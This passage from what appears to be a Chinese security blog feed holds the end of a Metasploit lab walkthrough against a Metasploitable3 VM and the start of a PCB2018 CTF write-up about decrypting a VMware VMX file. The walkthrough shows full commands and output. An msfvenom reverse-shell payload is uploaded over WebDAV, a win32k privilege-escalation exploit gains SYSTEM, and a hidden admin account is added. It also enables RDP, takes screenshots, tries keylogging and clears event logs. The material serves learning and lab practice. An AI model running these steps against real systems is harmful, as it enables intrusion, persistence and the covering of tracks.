class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter<span class="emphasis">_reverse_</span>tcp LHOST=192.168.75.128 LPORT=2222 -f exe -o ~/Desktop/2222.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 179779 bytes</span><br><span class="line">Final size of exe file: 254976 bytes</span><br><span class="line">Saved as: /root/Desktop/2222.exe</span><br><span class="line">root@kali:~# davtest -url http://192.168.75.134:8585/uploads -uploadfile ~/Desktop/2222.exe -uploadloc 2222.exe</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.75.134:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.75.134:8585/uploads/2222.exe</span><br></pre></td></tr></table></figure></li><li><p>通过shell运行exe,执行漏洞exp,权限从SERVICE提升为SYSTEM</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3  <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/<span class="comment">meterpreter_reverse_tcp</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (exploit/<span class="comment">multi</span>/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload <span class="keyword">options</span> (windows/<span class="comment">meterpreter_reverse_tcp):</span></span><br><span class="line"></span><br><span class="line">   Name        <span class="comment">Current Setting  Required  Description</span></span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   EXITFUNC    <span class="comment">process          yes       Exit technique (Accepted:</span> <span class="comment">''</span><span class="comment">, seh, thread, process, none)</span></span><br><span class="line">   EXTENSIONS                   <span class="comment">no        Comma-separate list of extensions to load</span></span><br><span class="line">   EXTINIT                      <span class="comment">no        Initialization strings for extensions</span></span><br><span class="line">   LHOST       <span class="comment">192.168.75.128   yes       The listen address (an interface may be specified)</span></span><br><span class="line">   LPORT       <span class="comment">1111             yes       The listen port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit <span class="comment">target:</span></span><br><span class="line"></span><br><span class="line">   Id  <span class="comment">Name</span></span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard <span class="comment">Target</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; set lport <span class="number">2222</span></span><br><span class="line">lport =&gt; <span class="number">2222</span></span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; run -j -z</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job 0.</span></span><br><span class="line">[*] Exploit <span class="comment">completed, but no session was created.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP handler on 192.168.75.128:2222</span> </span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/<span class="comment">windows  LOCAL SERVICE (0) @ METASPLOITABLE3  192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; execute -f <span class="comment">"C:\\wamp\\www\\uploads\\2222.exe"</span></span><br><span class="line">Process <span class="number">6076</span> created.</span><br><span class="line">meterpreter &gt; [*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">2222</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55448</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">27</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; sessions -l</span></span><br><span class="line"></span><br><span class="line">Active <span class="comment">sessions</span></span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  <span class="comment">Name  Type                     Information                                   Connection</span></span><br><span class="line">  --  ----  ----                     -----------                                   ----------</span><br><span class="line">  2         meterpreter <span class="comment">php</span>/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3           <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/<span class="comment">windows  NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3  192.168.75.128:2222 -&gt; 192.168.75.134:55448 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; use exploit/<span class="comment">windows</span>/local/<span class="comment">ms18_8120_win32k_privesc</span></span><br><span class="line">msf5 <span class="comment">exploit(windows</span>/local/<span class="comment">ms18_8120_win32k_privesc) &gt; show options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="comment">options (exploit</span>/windows/<span class="comment">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   <span class="keyword">yes</span>       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; set session <span class="number">3</span></span><br><span class="line">session =&gt; <span class="number">3</span></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[+] Exploit finished, wait <span class="keyword">for</span> privileged payload execution to complete.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span></span><br><span class="line">[*] Meterpreter session <span class="number">4</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55526</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">57</span>:<span class="number">19</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\<span class="keyword">SYSTEM</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="远程监控"><a href="#远程监控" class="headerlink" title="远程监控"></a>远程监控</h2><ol start="16"><li>可通过run vnc实现，也可以添加用户远程登陆<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; net user</span><br><span class="line">[-] Unknown command: net.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5892 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net localgroup administrators xiaoming /add</span><br><span class="line">net localgroup administrators xiaoming /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure></li></ol><ul><li>PS:开启3389端口:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</li></ul><ol start="17"><li>用户成功添加xiaoming<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  xiaoming                 </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br></pre></td></tr></table></figure></li></ol><h2 id="简单后渗透尝试"><a href="#简单后渗透尝试" class="headerlink" title="简单后渗透尝试"></a>简单后渗透尝试</h2><ol start="18"><li><p>查看是否为虚拟机</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[<span class="meta">*</span>] Checking <span class="keyword">if</span> METASPLOITABLE3 <span class="keyword">is</span> a Virtual Machine .....</span><br><span class="line">[<span class="meta">+</span>] This <span class="keyword">is</span> a VMware Virtual Machine</span><br></pre></td></tr></table></figure></li><li><p>用户是否在线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; quser</span><br><span class="line">[-] Unknown command: quser.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5828 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;quser</span><br><span class="line">quser</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line"> vagrant              <span class="built_in"> console </span>            1  Active      none   1/22/2019 6:06 PM</span><br></pre></td></tr></table></figure></li><li><p>检查闲置多久</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 6 hours 20 mins 34 secs</span><br></pre></td></tr></table></figure></li><li><p>多次截图对比管理员是否有操作</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">screenshot</span></span><br><span class="line"><span class="built_in">Screenshot</span> saved <span class="keyword">to</span>: /root/KMcxOzFn.jpeg</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/KMcxOzFn.jpeg?raw=true" alt=""></p><ol start="22"><li>获取用户hash<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190123165519.png?raw=true" alt=""></li><li><p>键盘监控，不过没成功。。。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke<span class="built_in"> sniffer </span><span class="built_in">..</span>.</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure></li><li><p>还有很多骚操作日后尝试。。现在最重要就是清除痕迹(事件日志)</p></li></ol><blockquote><p>clearev</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;metasploit学习&quot;&gt;&lt;a href=&quot;#metasploit学习&quot; class=&quot;headerlink&quot; title=&quot;metasploit学习&quot;&gt;&lt;/a&gt;metasploit学习&lt;/h1&gt;&lt;h2 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerlink&quot; title=&quot;主机发现&quot;&gt;&lt;/a&gt;主机发现&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;测试靶机主要为192.168.114.29,攻击机为192.168.114.176&lt;/strong&gt;&lt;blockquote&gt;
&lt;p&gt;db_nmap -v -n -sn 192.168.114.0/24&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://cy9nusg4rd3n.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux" scheme="https://cy9nusg4rd3n.github.io/tags/Linux/"/>
    
      <category term="nmap" scheme="https://cy9nusg4rd3n.github.io/tags/nmap/"/>
    
      <category term="msf" scheme="https://cy9nusg4rd3n.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>PCB2018部分Writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/12/05/PCB2018%E9%83%A8%E5%88%86Writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/12/05/PCB2018部分Writeup/</id>
    <published>2018-12-05T12:06:04.000Z</published>
    <updated>2020-04-18T03:31:37.928Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="hack1t-复现队里大佬的"><a href="#hack1t-复现队里大佬的" class="headerlink" title="hack1t(复现队里大佬的)"></a>hack1t(复现队里大佬的)</h2><a id="more"></a><ol><li>题目给了完整的VM虚拟机压缩包，文件都经过了加密，但给出了密码bibinb<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205184640.png?raw=true" alt=""></li><li>用密码登陆，发现无法直接登陆系统，还需要账号密码，简单的root等弱口令失败告终；在进入系统时进入GRUB进行恢复密码，发现根本没这个选项，一下子没了什么思路，开始面向搜索引擎</li><li>一番操作后大佬找这个<br><a href="https://github.com/RF3/VMwareVMX" target="_blank" rel="noopener">破解VMX配置</a><blockquote><p>可以通过配置CD-ROM的系统来加载这个文件</p></blockquote></li><li>首先解密一下这个”Ubuntu 64-bit.vmx”,然后输入密码bibinb</li><li>发现报错<blockquote><p>Error: File Ubuntu 64-bit.vmx is not a valid VMX file</p></blockquote></li><li>原来是main.py脚本有瑕疵(果然我是做不出来的，因为遇到这个我是直接放弃的)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205190937.png?raw=true" alt=""></li><li>把N改成n就行,然后得到<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">Password:</span><br><span class="line">guestos = <span class="string">"ubuntu-64"</span></span><br><span class="line">virtualhw<span class="selector-class">.version</span> = <span class="string">"13"</span></span><br><span class="line">config<span class="selector-class">.version</span> = <span class="string">"8"</span></span><br><span class="line">numvcpus = <span class="string">"2"</span></span><br><span class="line">cpuid<span class="selector-class">.coresPerSocket</span> = <span class="string">"1"</span></span><br><span class="line">memsize = <span class="string">"2048"</span></span><br><span class="line">pciBridge0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge4<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge4<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge4<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge5<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge5<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge5<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge6<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge6<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge6<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge7<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge7<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge7<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">vmci0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">mks<span class="selector-class">.enable3d</span> = <span class="string">"true"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.deviceType</span> = <span class="string">"disk"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.fileName</span> = <span class="string">"Ubuntu 64-bit-disk1.vmdk"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.mode</span> = <span class="string">"persistent"</span></span><br><span class="line">scsi0<span class="selector-class">.virtualDev</span> = <span class="string">"lsilogic"</span></span><br><span class="line">scsi0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">sata0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">vmci0<span class="selector-class">.unrestricted</span> = <span class="string">"false"</span></span><br><span class="line">vcpu<span class="selector-class">.hotadd</span> = <span class="string">"true"</span></span><br><span class="line">mem<span class="selector-class">.hotadd</span> = <span class="string">"true"</span></span><br><span class="line">powerType<span class="selector-class">.powerOff</span> = <span class="string">"soft"</span></span><br><span class="line">powerType<span class="selector-class">.reset</span> = <span class="string">"soft"</span></span><br><span class="line">powerType<span class="selector-class">.suspend</span> = <span class="string">"soft"</span></span><br><span class="line">toolscripts<span class="selector-class">.afterpoweron</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.afterresume</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.beforepoweroff</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.beforesuspend</span> = <span class="string">"true"</span></span><br><span class="line">tools<span class="selector-class">.syncTime</span> = <span class="string">"false"</span></span><br><span class="line">nvram = <span class="string">"Ubuntu 64-bit-file1.nvram"</span></span><br><span class="line">virtualHW<span class="selector-class">.productCompatibility</span> = <span class="string">"hosted"</span></span><br><span class="line">extendedConfigFile = <span class="string">"Ubuntu 64-bit.vmxf"</span></span><br><span class="line">dataFileKey = <span class="string">"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d"</span></span><br><span class="line">cryptoState = <span class="string">"encrypted"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.copy</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.dnd</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.paste</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">policy<span class="selector-class">.vm</span><span class="selector-class">.mvmtid</span> = <span class="string">"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29"</span></span><br><span class="line">rollingTier0<span class="selector-class">.uid</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier0<span class="selector-class">.interval</span> = <span class="string">"86400"</span></span><br><span class="line">rollingTier0<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier0<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier0<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">rollingTier1<span class="selector-class">.uid</span> = <span class="string">"2"</span></span><br><span class="line">rollingTier1<span class="selector-class">.interval</span> = <span class="string">"604800"</span></span><br><span class="line">rollingTier1<span class="selector-class">.baseTier</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier1<span class="selector-class">.baseTierInterval</span> = <span class="string">"7"</span></span><br><span class="line">rollingTier1<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier1<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span 